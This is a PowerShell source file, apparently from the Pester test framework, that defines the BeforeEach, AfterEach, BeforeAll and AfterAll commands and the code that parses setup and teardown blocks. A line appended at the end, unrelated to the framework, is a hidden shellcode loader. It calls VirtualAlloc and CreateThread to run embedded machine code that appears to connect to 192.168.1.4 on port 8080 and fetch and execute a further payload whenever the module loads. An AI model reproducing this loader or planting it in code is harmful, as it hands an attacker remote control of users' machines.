function BeforeEach {
    
    [CmdletBinding()]
    param
    (
        
        [Parameter(Mandatory = $true,
            Position = 1)]
        [Scriptblock]
        $Scriptblock
    )
    Assert-DescribeInProgress -CommandName BeforeEach
}

function AfterEach {
    
    [CmdletBinding()]
    param
    (
        
        [Parameter(Mandatory = $true,
            Position = 1)]
        [Scriptblock]
        $Scriptblock
    )
    Assert-DescribeInProgress -CommandName AfterEach
}

function BeforeAll {
    
    [CmdletBinding()]
    param
    (
        
        [Parameter(Mandatory = $true,
            Position = 1)]
        [Scriptblock]
        $Scriptblock
    )
    Assert-DescribeInProgress -CommandName BeforeAll
}

function AfterAll {
    
    [CmdletBinding()]
    param
    (
        
        [Parameter(Mandatory = $true,
            Position = 1)]
        [Scriptblock]
        $Scriptblock
    )
    Assert-DescribeInProgress -CommandName AfterAll
}

function Invoke-TestCaseSetupBlocks {
    Invoke-Blocks -ScriptBlock $pester.GetTestCaseSetupBlocks()
}

function Invoke-TestCaseTeardownBlocks {
    Invoke-Blocks -ScriptBlock $pester.GetTestCaseTeardownBlocks()
}

function Invoke-TestGroupSetupBlocks {
    Invoke-Blocks -ScriptBlock $pester.GetCurrentTestGroupSetupBlocks()
}

function Invoke-TestGroupTeardownBlocks {
    Invoke-Blocks -ScriptBlock $pester.GetCurrentTestGroupTeardownBlocks()
}

function Invoke-Blocks {
    param ([scriptblock[]] $ScriptBlock)

    foreach ($block in $ScriptBlock) {
        if ($null -eq $block) {
            continue
        }
        $null = . $block
    }
}

function Add-SetupAndTeardown {
    param (
        [scriptblock] $ScriptBlock
    )

    if ($PSVersionTable.PSVersion.Major -le 2) {
        Add-SetupAndTeardownV2 -ScriptBlock $ScriptBlock
    }
    else {
        Add-SetupAndTeardownV3 -ScriptBlock $ScriptBlock
    }
}

function Add-SetupAndTeardownV3 {
    param (
        [scriptblock] $ScriptBlock
    )

    $pattern = '^(?:Before|After)(?:Each|All)$'
    $predicate = {
        param ([System.Management.Automation.Language.Ast] $Ast)

        $Ast -is [System.Management.Automation.Language.CommandAst] -and
        $Ast.CommandElements[0].ToString() -match $pattern -and
        $Ast.CommandElements[-1] -is [System.Management.Automation.Language.ScriptBlockExpressionAst]
    }

    $searchNestedBlocks = $false

    $calls = $ScriptBlock.Ast.FindAll($predicate, $searchNestedBlocks)

    foreach ($call in $calls) {
        
        
        

        $iPmdProviderType = [scriptblock].Assembly.GetType('System.Management.Automation.Language.IParameterMetadataProvider')

        $flags = [System.Reflection.BindingFlags]'Instance, NonPublic'
        $constructor = [scriptblock].GetConstructor($flags, $null, [Type[]]@($iPmdProviderType, [bool]), $null)

        $block = $constructor.Invoke(@($call.CommandElements[-1].ScriptBlock, $false))

        Set-ScriptBlockScope -ScriptBlock $block -SessionState $pester.SessionState
        $commandName = $call.CommandElements[0].ToString()
        Add-SetupOrTeardownScriptBlock -CommandName $commandName -ScriptBlock $block
    }
}

function Add-SetupAndTeardownV2 {
    param (
        [scriptblock] $ScriptBlock
    )

    $codeText = $ScriptBlock.ToString()
    $tokens = @(ParseCodeIntoTokens -CodeText $codeText)

    for ($i = 0; $i -lt $tokens.Count; $i++) {
        $token = $tokens[$i]
        $type = $token.Type
        if ($type -eq [System.Management.Automation.PSTokenType]::Command -and
            (IsSetupOrTeardownCommand -CommandName $token.Content)) {
            $openBraceIndex, $closeBraceIndex = Get-BraceIndicesForCommand -Tokens $tokens -CommandIndex $i

            $block = Get-ScriptBlockFromTokens -Tokens $Tokens -OpenBraceIndex $openBraceIndex -CloseBraceIndex $closeBraceIndex -CodeText $codeText
            Add-SetupOrTeardownScriptBlock -CommandName $token.Content -ScriptBlock $block

            $i = $closeBraceIndex
        }
        elseif ($type -eq [System.Management.Automation.PSTokenType]::GroupStart) {
            
            
            
            $i = Get-GroupCloseTokenIndex -Tokens $tokens -GroupStartTokenIndex $i
        }
    }
}

function ParseCodeIntoTokens {
    param ([string] $CodeText)

    $parseErrors = $null
    $tokens = [System.Management.Automation.PSParser]::Tokenize($CodeText, [ref] $parseErrors)

    if ($parseErrors.Count -gt 0) {
        $currentScope = $pester.CurrentTestGroup.Hint
        if (-not $currentScope) {
            $currentScope = 'test group'
        }
        throw "The current $currentScope block contains syntax errors."
    }

    return $tokens
}

function IsSetupOrTeardownCommand {
    param ([string] $CommandName)
    return (IsSetupCommand -CommandName $CommandName) -or (IsTeardownCommand -CommandName $CommandName)
}

function IsSetupCommand {
    param ([string] $CommandName)
    return $CommandName -eq 'BeforeEach' -or $CommandName -eq 'BeforeAll'
}

function IsTeardownCommand {
    param ([string] $CommandName)
    return $CommandName -eq 'AfterEach' -or $CommandName -eq 'AfterAll'
}

function IsTestGroupCommand {
    param ([string] $CommandName)
    return $CommandName -eq 'BeforeAll' -or $CommandName -eq 'AfterAll'
}

function Get-BraceIndicesForCommand {
    param (
        [System.Management.Automation.PSToken[]] $Tokens,
        [int] $CommandIndex
    )

    $openingGroupTokenIndex = Get-GroupStartTokenForCommand -Tokens $Tokens -CommandIndex $CommandIndex
    $closingGroupTokenIndex = Get-GroupCloseTokenIndex -Tokens $Tokens -GroupStartTokenIndex $openingGroupTokenIndex

    return $openingGroupTokenIndex, $closingGroupTokenIndex
}

function Get-GroupStartTokenForCommand {
    param (
        [System.Management.Automation.PSToken[]] $Tokens,
        [int] $CommandIndex
    )

    $commandName = $Tokens[$CommandIndex].Content

    
    if ($CommandIndex + 1 -lt $tokens.Count -and
        ($tokens[$CommandIndex + 1].Type -eq [System.Management.Automation.PSTokenType]::GroupStart -or
            $tokens[$CommandIndex + 1].Content -eq '{')) {
        return $CommandIndex + 1
    }

    
    if ($CommandIndex + 2 -lt $tokens.Count -and
        ($tokens[$CommandIndex + 2].Type -eq [System.Management.Automation.PSTokenType]::GroupStart -or
            $tokens[$CommandIndex + 2].Content -eq '{')) {
        return $CommandIndex + 2
    }

    throw "The $commandName command must be followed by the script block as the first argument or named parameter value."
}

& $SafeCommands['Add-Type'] -TypeDefinition @'
    namespace Pester
    {
        using System;
        using System.Management.Automation;

        public static class ClosingBraceFinder
        {
            public static int GetClosingBraceIndex(PSToken[] tokens, int startIndex)
            {
                int groupLevel = 1;
                int len = tokens.Length;

                for (int i = startIndex + 1; i < len; i++)
                {
                    PSTokenType type = tokens[i].Type;
                    if (type == PSTokenType.GroupStart)
                    {
                        groupLevel++;
                    }
                    else if (type == PSTokenType.GroupEnd)
                    {
                        groupLevel--;

                        if (groupLevel <= 0) { return i; }
                    }
                }

                return -1;
            }
        }
    }
'@

function Get-GroupCloseTokenIndex {
    param (
        [System.Management.Automation.PSToken[]] $Tokens,
        [int] $GroupStartTokenIndex
    )

    $closeIndex = [Pester.ClosingBraceFinder]::GetClosingBraceIndex($Tokens, $GroupStartTokenIndex)

    if ($closeIndex -lt 0) {
        throw 'No corresponding GroupEnd token was found.'
    }

    return $closeIndex
}

function Get-ScriptBlockFromTokens {
    param (
        [System.Management.Automation.PSToken[]] $Tokens,
        [int] $OpenBraceIndex,
        [int] $CloseBraceIndex,
        [string] $CodeText
    )

    $blockStart = $Tokens[$OpenBraceIndex + 1].Start
    $blockLength = $Tokens[$CloseBraceIndex].Start - $blockStart
    $setupOrTeardownCodeText = $codeText.Substring($blockStart, $blockLength)

    $scriptBlock = [scriptblock]::Create($setupOrTeardownCodeText)
    Set-ScriptBlockHint -Hint "Unbound ScriptBlock from Get-ScriptBlockFromTokens" -ScriptBlock $scriptBlock
    Set-ScriptBlockScope -ScriptBlock $scriptBlock -SessionState $pester.SessionState

    return $scriptBlock
}

function Add-SetupOrTeardownScriptBlock {
    param (
        [string] $CommandName,
        [scriptblock] $ScriptBlock
    )

    $Pester.AddSetupOrTeardownBlock($ScriptBlock, $CommandName)
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

